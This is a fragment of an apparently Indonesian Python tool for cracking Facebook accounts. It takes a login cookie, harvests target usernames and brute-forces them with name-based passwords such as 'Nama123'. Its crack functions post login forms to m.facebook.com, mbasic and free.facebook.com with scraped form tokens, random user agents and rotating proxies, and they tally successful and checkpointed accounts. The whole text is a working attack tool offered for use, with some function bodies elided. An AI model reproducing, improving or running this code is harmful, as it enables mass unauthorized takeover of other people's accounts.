...
def banner():
 ...
 | |_ / /_\ \ /  \/| |__ | |_/ /| | | || | | | |/ /     |  |   Thanks To Alvino
 |  _||  _  | |    |  __|| ___ \| | | || | | |    \     |  |   Recode By BrayennnXD 
 | |  | | | | \__/\| |___| |_/ /\ \_/ /\ \_/ / |\  \    |  |   Version 2.4
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tLogin Mengunakan Cookie Disarankan Untuk Menggunakan Akun Pribadi ',width=90))
		ses = requests.Session()
		cookie = input('\n   Masukan Cookie : ')
...
def crack_nama():
	...
	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 10.000 Username",width=90,padding=(0,2)))
...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode M.facebook.com [ ALL PROVIDER ][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode Mbasic.facebook.com [ WIFI,TRI,AXIS AND TELKOMSEL ][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Metode Free.facebook.com [ TRI AND AXIS ][/]\n[bold white][[bold green]04[/][bold white]][/] [bold white]Metode M.facebook.com V2 [ ALL PROVIDER ][/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Metode Lawak [ TRI,SMARTFREN AND IM3 ][/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Metode Lawak V2 [ WIFI,TELKOM,AXIS AND TRI ][/]',width=90,title=f"[bold green]Setting Metode",style=f"bold white"))
	print('')
	...
	cetak(panel('''[bold white][[bold green]01[bold white]] [bold white]Nama, Nama123, Nama1234 [ Very Recommended ]
...
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D822564807908213%26cbt%3D1677973902912%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df2e0393ba3bbba4%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ff3dcf0bbd2ba2ac%2526relation%253Dopener%26client_id%3D822564807908213%26display%3Dtouch%26domain%3Dbima.tri.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbima.tri.co.id%252Fprofile%26fields%3Dname%252Cemail%252Cpicture%252Cfirst_name%252Clast_name%26locale%3Den_US%26logger_id%3Df17a27b72cd05e4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df39fc252d3fa494%2526domain%253Dbima.tri.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbima.tri.co.id%25252Ff3dcf0bbd2ba2ac%2526relation%253Dopener%2526frame%253Df1605754d536f4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%252Cpublic_profile%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df39fc252d3fa494%26domain%3Dbima.tri.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbima.tri.co.id%252Ff3dcf0bbd2ba2ac%26relation%3Dopener%26frame%3Df1605754d536f4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
...
def crackmobilev2(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{h}Mobile V2{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			nip=random.choice(prox)
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1676027180738%26channel_url%3Dhttps%253A%252F%252Fstaticxtouch.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df363b0a73c19804%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dtouch%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252F%26locale%3Den_US%26logger_id%3Df3d20d066ff6254%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxtouch.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df14522bfee17014%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff20019dbd9069f8%2526relation%253Dopener%2526frame%253Df185d306bc50d08%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxtouch.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df14522bfee17014%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff20019dbd9069f8%26relation%3Dopener%26frame%3Df185d306bc50d08%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
